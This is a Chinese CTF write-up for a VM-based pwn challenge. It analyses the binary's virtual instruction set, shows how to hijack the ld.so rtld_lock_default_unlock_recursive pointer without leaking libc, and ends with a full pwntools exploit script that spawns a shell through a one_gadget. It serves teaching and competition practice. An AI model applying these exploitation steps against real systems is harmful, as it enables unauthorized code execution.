# 记一道有趣的VM PWN

阅读量 **125028**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-09-09 10:00:27

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t010945cfe9b10700a3.jpg)

题目亮点在于无需泄露`libc`地址，操控程序内部计算即可进行精准覆盖。

## 题目信息

题目附件：`pwn`、`libc-2.27.so`

    
    
    radish ➜ nice  checksec pwn
    [*] '/root/nice/pwn'
        Arch:     amd64-64-little
        RELRO:    Full RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      PIE enabled
    radish ➜ nice  strings pwn | grep "GCC"
    GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
    radish ➜ nice  ./libc-2.27.so 
    GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.4) stable release version 2.27.
    Copyright (C) 2018 Free Software Foundation, Inc.
    This is free software; see the source for copying conditions.
    There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
    PARTICULAR PURPOSE.
    Compiled by GNU CC version 7.5.0.
    libc ABIs: UNIQUE IFUNC
    For bug reporting instructions, please see:
    <https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.
    

## 程序分析

`main`函数逻辑很简单，先是在bss段上读入一个字符串，然后调用了`execve`函数

![](https://p0.ssl.qhimg.com/t01896d4c2e081f988f.jpg)

`execve`函数中实现了一套虚拟指令，提供的功能有加减乘除的赋值运算，并没有其他输出输入的操作

    
    
    v1 = 0LL;
      do
      {
        while ( 1 )
        {
          while ( 1 )
          {
            while ( 1 )
            {
              while ( 1 )
              {
                while ( 1 )
                {
                  while ( 1 )
                  {
                    v29 = *(&unk_202060 + v1++ + 512);
                    result = v29;
                    if ( v29 != 6 )
                      break;
                    v15 = *(&unk_202060 + v1 + 512);
                    v6 = v1 + 1;
                    v24 = *(&unk_202060 + v6 + 512);
                    v1 = v6 + 1;
                    *(&unk_202060 + v15) *= v24;
                  }
                  if ( v29 > 6 )
                    break;
                  if ( v29 == 3 )
                  {
                    v13 = *(&unk_202060 + v1 + 512);
                    v4 = v1 + 1;
                    v22 = *(&unk_202060 + v4 + 512);
                    v1 = v4 + 1;
                    *(&unk_202060 + v13) -= v22;
                  }
                  else if ( v29 > 3 )
                  {
                    v14 = *(&unk_202060 + v1 + 512);
                    v5 = v1 + 1;
                    v23 = *(&unk_202060 + v5 + 512);
                    v1 = v5 + 1;
                    if ( v29 == 4 )
                      *(&unk_202060 + v14) += *(&unk_202060 + v23);
                    else
                      *(&unk_202060 + v14) -= *(&unk_202060 + v23);
                  }
                  else if ( v29 == 1 )
                  {
                    v11 = *(&unk_202060 + v1 + 512);
                    v2 = v1 + 1;
                    v20 = *(&unk_202060 + v2 + 512);
                    v1 = v2 + 1;
                    *(&unk_202060 + v11) = v20;
                  }
                  else if ( v29 == 2 )
                  {
                    v12 = *(&unk_202060 + v1 + 512);
                    v3 = v1 + 1;
                    v21 = *(&unk_202060 + v3 + 512);
                    v1 = v3 + 1;
                    *(&unk_202060 + v12) += v21;
                  }
                }
                if ( v29 != 9 )
                  break;
                v17 = *(&unk_202060 + v1 + 512);
                v8 = v1 + 1;
                v26 = *(&unk_202060 + v8 + 512);
                v1 = v8 + 1;
                *(&unk_202060 + *(&unk_202060 + v17)) -= *(&unk_202060 + v26);
              }
              if ( v29 > 9 )
                break;
              v16 = *(&unk_202060 + v1 + 512);
              v7 = v1 + 1;
              v25 = *(&unk_202060 + v7 + 512);
              v1 = v7 + 1;
              if ( v29 == 7 )
                *(&unk_202060 + v16) /= v25;
              else
                *(&unk_202060 + *(&unk_202060 + v16)) += *(&unk_202060 + v25);
            }
            if ( v29 != 11 )
              break;
            v19 = *(&unk_202060 + v1 + 512);
            v10 = v1 + 1;
            v28 = *(&unk_202060 + v10 + 512);
            v1 = v10 + 1;
            *(&unk_202060 + v19) -= *(&unk_202060 + *(&unk_202060 + v28));
          }
          if ( v29 >= 11 )
            break;
          v18 = *(&unk_202060 + v1 + 512);
          v9 = v1 + 1;
          v27 = *(&unk_202060 + v9 + 512);
          v1 = v9 + 1;
          *(&unk_202060 + v18) += *(&unk_202060 + *(&unk_202060 + v27));
        }
      }
      while ( v29 != 0xFF );
      return result;
    }
    

## 解题思路

我并没有想到有什么办法可以泄露libc地址，但是可以通过任意地址写，而写的值也是可以通过`.bss`段上的数据计算得出。我的思路就是劫持__rtld_lock_unlock_recursive  
当程序正常退出时，会调用这里的代码。指向此地址的指针（以下称之为指着P）在`/lib/x86_64-linux-gnu/ld-2.27.so`地址空间中。原理可查看源码`glibc/elf/dl-fini.c`

通过以下方式找到该指针

    
    
    pwndbg> vmmap
    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
        0x555555554000     0x555555556000 r-xp     2000 0      /root/nice/pwn
        0x555555755000     0x555555756000 r--p     1000 1000   /root/nice/pwn
        0x555555756000     0x555555757000 rw-p     1000 2000   /root/nice/pwn
        0x555555757000     0x55555575a000 rw-p     3000 0      [heap]
        0x7ffff79e4000     0x7ffff7bcb000 r-xp   1e7000 0      /lib/x86_64-linux-gnu/libc-2.27.so
        0x7ffff7bcb000     0x7ffff7dcb000 ---p   200000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
        0x7ffff7dcb000     0x7ffff7dcf000 r--p     4000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
        0x7ffff7dcf000     0x7ffff7dd1000 rw-p     2000 1eb000 /lib/x86_64-linux-gnu/libc-2.27.so
        0x7ffff7dd1000     0x7ffff7dd5000 rw-p     4000 0      
        0x7ffff7dd5000     0x7ffff7dfc000 r-xp    27000 0      /lib/x86_64-linux-gnu/ld-2.27.so
        0x7ffff7fdf000     0x7ffff7fe1000 rw-p     2000 0      
        0x7ffff7ff8000     0x7ffff7ffb000 r--p     3000 0      [vvar]
        0x7ffff7ffb000     0x7ffff7ffc000 r-xp     1000 0      [vdso]
        0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 27000  /lib/x86_64-linux-gnu/ld-2.27.so
        0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 28000  /lib/x86_64-linux-gnu/ld-2.27.so
        0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      
        0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]
    0xffffffffff600000 0xffffffffff601000 --xp     1000 0      [vsyscall]
    pwndbg> p rtld_lock_default_unlock_recursive
    $1 = {void (void *)} 0x7ffff7dd60f0 <rtld_lock_default_unlock_recursive>
    pwndbg> search -p 0x7ffff7dd60f0
    warning: Unable to access 16000 bytes of target memory at 0x7ffff7bd2d07, halting search.
    ld-2.27.so      0x7ffff7ffdf68 0x7ffff7dd60f0
    pwndbg>
    

修改该指针的思路:  
1、修改bss段上stderr的地址为libc基地址，`payload =
p64(3)+p64(0x10000000000000000-4)+p64(0x3ec680)`

![](https://p1.ssl.qhimg.com/t017e9b52b5916922cb.jpg)

2、将指针P的值与`One_gadget`的偏移填充到`0x202060`处，供之后劫持指针使用

![](https://p5.ssl.qhimg.com/t010154f0f5e2be6dd8.jpg)

3、把原`stderr`地址出修改成`0x202008`到指针P的偏移加上libc地址。`payload +=
p64(2)+p64(0x10000000000000000-4)+p64(0x619000+3944-88)`

![](https://p2.ssl.qhimg.com/t0129c8bb3a98d44f5f.jpg)

>
> 为什么要选择`0x202008`？因为之后修改指针P的值是利用虚拟指令9的功能，之前的操作无法得到地址`0x202060`到指针P的距离，所以我们只能通过先减去一个程序的地址，然后再加上`0x202060`和它们之间的填充（也许是负数）,就可以通过虚拟指令9的功能进行劫持。

4、继步骤三操作，减去程序的某个地址，这里选用`0x202008`,因为它在`stderr`上方附近，便于操作。`payload +=
p64(5)+p64(0x10000000000000000-4)+p64(0x10000000000000000-11)`

![](https://p0.ssl.qhimg.com/t012692b4d4ebeabb08.jpg)

5、将步骤3的值除8，因为虚拟指令9是通过`int64`指针进行复制的，所以我们需要计算出Index（类似于数组）。`payload +=
p64(7)+p64(0x10000000000000000-4)+p64(8)`

![](https://p4.ssl.qhimg.com/t01d88a9360834ca767.jpg)

6、进行指针修改并结束程序。`payload += p64(9)+p64(0x10000000000000000-4)+p64(0)+p64(0xff)`

![](https://p5.ssl.qhimg.com/t017a5a43238133e075.jpg)

###  exp

    
    
    #coding:utf-8
    from pwn import *
    # from LibcSearcher import *
    #author:萝卜啊啊啊啊啊啊啊
    context.log_level='debug'
    debug = 1
    file_name = './pwn'
    libc_name = '/lib/x86_64-linux-gnu/libc.so.6'
    ip = ''
    prot = ''
    if debug:
        r = process(file_name)
        libc = ELF(libc_name)
    else:
        r = remote(ip,int(prot))
        libc = ELF(libc_name)
    
    def debug():
        gdb.attach(r)
        raw_input()
    
    
    file = ELF(file_name)
    sl = lambda x : r.sendline(x)
    sd = lambda x : r.send(x)
    sla = lambda x,y : r.sendlineafter(x,y)
    rud = lambda x : r.recvuntil(x,drop=True)
    ru = lambda x : r.recvuntil(x)
    li = lambda name,x : log.info(name+':'+hex(x))
    ri = lambda  : r.interactive()
    # debug()
    payload = p64(3)+p64(0x10000000000000000-4)+p64(0x3ec680)
    payload += p64(1)+p64(0)+p64(3812747-93)
    payload += p64(2)+p64(0x10000000000000000-4)+p64(0x619000+3944-88)#targte
    payload += p64(5)+p64(0x10000000000000000-4)+p64(0x10000000000000000-11)
    payload += p64(7)+p64(0x10000000000000000-4)+p64(8)
    payload += p64(9)+p64(0x10000000000000000-4)+p64(0)
    payload += p64(0xff)
    sl(payload)
    ri()
    '''
    0x4f365 execve("/bin/sh", rsp+0x40, environ)
    constraints:
      rsp & 0xf == 0
      rcx == NULL
    
    0x4f3c2 execve("/bin/sh", rsp+0x40, environ)
    constraints:
      [rsp+0x40] == NULL
    
    0x10a45c execve("/bin/sh", rsp+0x70, environ)
    constraints:
      [rsp+0x70] == NULL
    
    '''
    

> 感觉还有一种解法，就是劫持ret地址，但是没找到合适的栈指针。

## Referer

<https://www.anquanke.com/post/id/199832#h2-8>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **萝卜啊啊啊啊啊啊** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/252550](/post/id/252550)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Pwn](/tag/Pwn)

 **+1** __5赞

 __收藏

![](https://p1.ssl.qhimg.com/t014aa7348eeeb820f6.png) 萝卜啊啊啊啊啊啊

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

